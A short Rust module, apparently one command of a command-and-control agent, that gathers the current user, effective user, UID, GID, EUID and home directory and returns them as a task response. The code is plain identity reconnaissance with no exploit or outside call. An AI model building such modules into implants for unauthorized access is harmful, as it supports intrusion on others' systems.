use crate::structs::Task;
use crate::utils;

pub async fn execute(task: Task) {
    let mut response = task.new_response();

    let user = utils::get_user();
    let effective = utils::get_effective_user();
    let uid = nix::unistd::getuid();
    let gid = nix::unistd::getgid();
    let euid = nix::unistd::geteuid();
    let home = std::env::var("HOME").unwrap_or_default();

    response.user_output = format!(
        "User: {}\nEffective User: {}\nUID: {}\nGID: {}\nEUID: {}\nHome: {}",
        user, effective, uid, gid, euid, home
    );
    response.completed = true;

    let _ = task.job.send_responses.send(response).await;
    let _ = task.remove_running_task.send(task.data.task_id.clone()).await;
}
